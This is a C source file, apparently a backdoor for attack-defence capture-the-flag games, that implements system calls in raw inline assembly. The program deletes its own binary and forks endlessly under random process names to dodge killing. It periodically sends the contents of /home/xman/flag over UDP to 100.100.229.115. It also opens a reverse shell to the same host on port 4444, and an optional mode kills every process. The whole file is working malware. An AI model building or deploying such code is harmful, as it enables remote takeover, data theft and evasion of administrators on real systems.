#define INTERVAL 100 //轮询时间间隔，可以根据情况改小
/*compile: 切记不能使用优化选项
For x64: gcc crazy_asm.c -o crazy_asm -DX64 -nostdlib
For x86: gcc -m32 crazy_asm.c -o crazy_asm -DX86 -nostdlib
*/
#if 1
#define forceinline static __inline__ __attribute__((always_inline))
#else
#define forceinline
#endif
struct sockaddr_in
{
    unsigned short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    unsigned char sin_zero[8];
};

#ifdef X64
long int syscall(long int __sysno, ...)
{
    __asm__ __volatile__ (
      "mov      %%rdi, %%rax\n"
      "mov      %%rsi, %%rdi\n"
      "mov      %%rdx, %%rsi\n"
      "mov      %%rcx, %%rdx\n"
      "mov      %%r8, %%r10\n"
      "mov      %%r9, %%r8\n"
      "mov      0x8(%%rsp), %%r9\n"
      "syscall\n"
      :
      :
      :"memory", "rsi", "rdi", "rax", "rbx", "rcx", "rdx");
}

forceinline void exit(int status)
{
    syscall(0x3c, status);
}

forceinline int fork()
{
    return syscall(0x39);
}

forceinline void umask(long mask)
{
    syscall(0x5f, mask);
}

forceinline setsid()
{
    syscall(0x70);
}

forceinline daemonlize()
{
    umask(0);
    
    if(fork() > 0)
    {
        exit(0);
    }
    setsid();
}

forceinline int kill(int pid, int signal)
{
    return syscall(0x3e, pid, signal);
}

forceinline int open(const char *path, int oflag)
{
    return syscall(0x2, path, oflag);
}

forceinline int read(int fd, void *buf, unsigned int nbyte)
{
    return syscall(0, fd, buf, nbyte);
}

forceinline int close(int fd)
{
    return syscall(3, fd);
}

forceinline int socket(int family, int type, int proto)
{
    return syscall(0x29, family, type, proto);
}

forceinline int sendto(int fd, void *buff, int len, int flags, struct sockaddr_in * addr, int addrsize)
{
    return syscall(0x2c, fd, buff, len, flags, addr, addrsize);
}

forceinline void usleep(struct timeval *delay)
{
    //select(0,0,0,0,delay)
    syscall(0x17, 0,0,0,0, delay);
}

forceinline void prctl(int cmd, char * name)
{
    syscall(0x9d, cmd, name);
}

forceinline int write(int fd, void * buf, unsigned int nbyte)
{
    return syscall(1, fd, buf, nbyte);
}

forceinline int execve(const char * path, char * const argv[], char *const *envp)
{
    return syscall(0x3b, path, argv, envp);
}

forceinline void dup2(int filedes, int filedes2)
{
    syscall(0x21, filedes, filedes2);
}

forceinline int connect(int fd, struct sockaddr_in *uservaddr, int addrlen)
{
    return syscall(0x2a, fd, uservaddr, addrlen);
}

forceinline int unlink(const char *path)
{
    return syscall(0x57, path);
}
#endif

#ifdef X86
#define SYS_SOCKET  1
#define SYS_CONNECT 3
#define SYS_SENDTO  11
int fork()
{
    __asm__("xor %eax,%eax\n"
            "mov $0x2,%al\n"
            "int $0x80");
}

void daemonlize()
{
    //umask(0)
    __asm__("xor %eax,%eax\n"
            "xor %ebx,%ebx\n"
            "mov $0x3c,%al\n"
            "int $0x80");
    
    if(fork() > 0)
    {
        //exit(0)
        __asm__("xor %eax,%eax\n"
                "mov $0x1,%eax\n"
                "int $0x80");
    }
    //setsid();
    __asm__("xor %eax,%eax\n"
            "mov $0x42,%eax\n"
            "int $0x80");
}

int open(const char *path, int oflag)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x5,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int read(int fd, void *buf, unsigned int nbyte)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x3,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "mov 0x10(%ebp), %edx\n"
            "int $0x80");
}

int kill(int pid, int signal)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x25, %al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int close(int fd)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x6,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "int $0x80");
}

int socketall(int call, unsigned long * args)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x66,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int socket(int family, int type, int proto)
{
    unsigned long args[3] = {family, type, proto};
    return socketall(SYS_SOCKET, args);
}

int sendto(int fd, void *buff, int len, int flags, struct sockaddr_in * addr, int addrsize)
{
    unsigned long args[6] = {fd, (unsigned long)buff, len, flags, (unsigned long)addr, addrsize};
    return socketall(SYS_SENDTO, args);
}

void usleep(struct timeval *delay)
{
    //select(0,0,0,0,delay)
    __asm__("xor %eax,%eax\n"
            "mov $0x8e, %al\n"
            "mov 0x8(%ebp), %edi\n"
            "xor %ebx,%ebx\n"
            "xor %ecx,%ecx\n"
            "xor %edx,%edx\n"
            "xor %esi,%esi\n"
            "int $0x80"
            );
}

void prctl(int cmd, char * name)
{
    __asm__("xor %eax,%eax\n"
            "mov $0xac,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

void write(int fd, void * buf, unsigned int nbyte)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x4,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "mov 0x10(%ebp), %edx\n"
            "int $0x80");
}

void execve(const char * path, char * const argv[], char *const *envp)
{
    __asm__("xor %eax,%eax\n"
            "mov $0xb,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "mov 0x10(%ebp), %edx\n"
            "int $0x80");
}

void dup2(int filedes, int filedes2)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x3f,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int connect(int fd, struct sockaddr_in *uservaddr, int addrlen)
{
    unsigned long args[3] = {fd, uservaddr, addrlen};
    return socketall(SYS_CONNECT, args);
}

int exit(int status)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x1,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "int $0x80");
}

int unlink(const char *path)
{
    __asm__("xor %eax,%eax\n"
            "mov $0xa,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "int $0x80");
}
#endif

forceinline void get_name(char * argv0)
{
    unsigned char namelen = 0;
    int fd = open("/dev/urandom", 0);
    read(fd, &namelen, 1);
    namelen &= 0xF;
    read(fd, argv0, namelen);
    argv0[namelen] = 0;
    close(fd);
}

forceinline void post_flag()
{
    int sock = socket(2,2,0);//udp
    struct sockaddr_in addr = {0,0,0,{0,0,0,0,0,0,0,0}};
    addr.sin_family = 2;
    addr.sin_port = 0xB722;//8887
    addr.sin_addr = 0x73E56464;//100.100.229.115

    int fd = open("/home/xman/flag", 0);
    char msg[255] = {0};
    int len = read(fd, msg, sizeof(msg));
    close(fd);
    sendto(sock, msg, len, 0, &addr, sizeof(addr));
    close(sock);
}

forceinline void reverse_shell()
{
    if(fork() > 0)
    {
        return;
    }
    //child
    int sockfd = socket(2,1,0);//tcp
    struct sockaddr_in addr = {0,0,0,{0,0,0,0,0,0,0,0}};
    addr.sin_family = 2;
    addr.sin_port = 0x5c11;//4444
    addr.sin_addr = 0x73E56464;//100.100.229.115

    if(connect(sockfd, &addr, sizeof(addr)) != 0)
        exit(0);
    
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);

    execve("/bin/sh",0,0);
}

forceinline void self_delete()
{
    int fd = open("/proc/self/cmdline", 0);
    char path[255] = {0};
    read(fd, path, sizeof(path));
    close(fd);
    unlink(path);
}

int g_timer = 0;

//#define CLEAN_BKDOOR
void _start()
{
    self_delete();
new_child:
    daemonlize();
    char name[16] = {0};
    get_name(name);
    prctl(15, name); 
    //do job
    ++g_timer;
    if(g_timer == 10000)//10000次,3-4秒周期
    {
        g_timer = 0;
        post_flag();
    #if !defined(CLEAN_BKDOOR)
        reverse_shell();
    #endif
    }
#if defined(CLEAN_BKDOOR)
    kill(-1, 9);
#endif    
    
    struct timeval
    {
        long tv_sec;
        long tv_usec;
    }tvp = {0, INTERVAL};

    usleep(&tvp);
    goto new_child;
}
 
